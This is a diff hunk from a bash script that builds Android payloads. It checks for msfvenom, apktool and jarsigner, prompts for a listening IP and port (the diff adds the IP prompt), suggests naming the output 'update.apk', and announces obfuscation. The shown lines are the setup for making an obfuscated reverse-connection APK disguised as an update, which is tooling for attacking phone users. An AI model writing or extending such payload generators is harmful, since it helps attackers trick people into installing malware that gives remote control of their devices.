@@ -100,6 +100,7 @@ EOF
     # Android Payload Generation
     elif [[ $DEVICE_TYPE -eq 2 ]]; then
         check_requirements "msfvenom apache2 apktool jarsigner"
+        read -p "Enter LHOST (Listening IP ADDRESS): " LHOST
         read -p "Enter LPORT (Listening Port): " LPORT
         read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
         echo -e "\e[93m[+] Generating Android payload with obfuscation...\e[0m"
